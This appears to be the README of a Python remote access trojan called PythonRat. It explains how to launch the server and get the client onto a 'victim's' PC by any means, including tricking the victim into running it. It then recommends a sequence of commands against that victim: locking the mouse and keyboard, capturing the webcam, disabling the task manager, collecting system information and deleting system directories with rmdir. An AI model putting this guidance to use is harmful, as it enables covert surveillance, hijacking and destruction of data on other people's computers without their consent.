## On your pc : 
+ Go to an empty directory. Now go to Visual Studio Code and open the empty directory.

+ You will need to clone the repo, so you have to use [git](https://github.com/git-for-windows/git/releases/download/v2.40.0.windows.1/Git-2.40.0-64-bit.exe).

+ Then, run the command `cd PythonRat` to get into the Rat directory.

+ Now, run the command `pip install -r server_requirements.txt`, this will install all the required files.

To launch the server, just run `python server.py`, and now wait for the victim to run the client.pyw.

## On the victim's pc :
+ By any way, put by yourself or make the victim put the client.pyw and the client_requirements.txt on the victim's pc in any directory.

+ Now open a cmd in the directory on the victim's pc, and type `pip install -r client_requirements.txt`

+ Then run `python client.pyw`

#### When it's done, you will receive the help on your pc.

# How to proprely f*ck a pc.

When the victim has launched the RAT, type this command : `disable --all`, the victim will no longer be able to move her mouse or her keyboard.

Then, i recommend to use these commands : `webcam`, `disabletaskmgr`, `writein YOU ARE NOW FUCKED ! GOODBY AMIGOS HAHAHA`, `browser`, `systeminfo`, `volumeup`, `sendmessage`, `rmdir "C:\system"`, `rmdir "C:\system64"` and you can finish with the `kill` command. ;)
